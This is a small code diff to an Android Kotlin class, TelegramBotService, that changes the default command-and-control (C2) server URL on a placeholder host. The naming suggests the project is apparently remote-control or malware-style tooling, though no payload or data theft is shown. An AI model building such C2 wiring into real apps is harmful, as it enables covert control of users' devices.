@@ -216,7 +216,7 @@ class TelegramBotService(private val context: Context) {
 
     private fun getC2Url(): String {
         val adminPrefs = context.getSharedPreferences("admin_config", Context.MODE_PRIVATE)
-        return adminPrefs.getString("c2_url", "https://c2.example.com:8443") ?: "https://c2.example.com:8443"
+        return adminPrefs.getString("c2_url", "https://c2.example.com/api") ?: "https://c2.example.com/api"
     }
 
     private fun getHelpMessage(): String {
